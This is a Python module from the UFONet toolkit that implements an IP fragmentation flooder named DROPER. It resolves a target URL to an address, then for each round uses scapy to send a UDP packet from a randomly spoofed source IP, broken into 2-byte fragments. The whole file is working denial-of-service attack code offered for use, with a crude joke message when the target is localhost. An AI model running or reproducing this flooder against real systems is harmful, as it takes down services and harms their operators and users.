#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

# UFONet IP FRAGMENTATION flooder (DROPER)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def droperize(ip, sport, rounds):
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_zombie_port = randInt() 
            IP_p = IP()
            IP_p.src = randIP()
            try:
                IP_p.dst = ip
            except:
                print("[Error] [AI] [DROPER] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                break
            TCP_l = TCP()
            TCP_l.sport = s_zombie_port
            TCP_l.dport = sport
            try:
                payload="A"*254+"B"*2 # 256b = 33frags
                packet=IP(src=IP_p.src,dst=IP_p.dst,id=12345)/UDP(sport=TCP_l.sport,dport=TCP_l.dport)/payload
                frags=fragment(packet,fragsize=2) # fragment size
                for f in frags:
                    send(f, verbose=0)
                print("[Info] [AI] [DROPER] Firing 'deuterium bosons' ["+str(n)+"] -> [DROPING!]")
                time.sleep(1) # sleep time required for balanced sucess
            except:
                print("[Error] [AI] [DROPER] Failed to engage with 'deuterium bosons' ["+str(n)+"]")
    except:
        print("[Error] [AI] [DROPER] Failing to engage... -> Is still target online? -> [Checking!]")

class DROPER(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] 'IP FRAGMENTATION' (DROPER) is ready to fire: [" , rounds, "deuterium bosons ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [DROPER] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        droperize(ip, sport, rounds) # attack with DROPER using threading
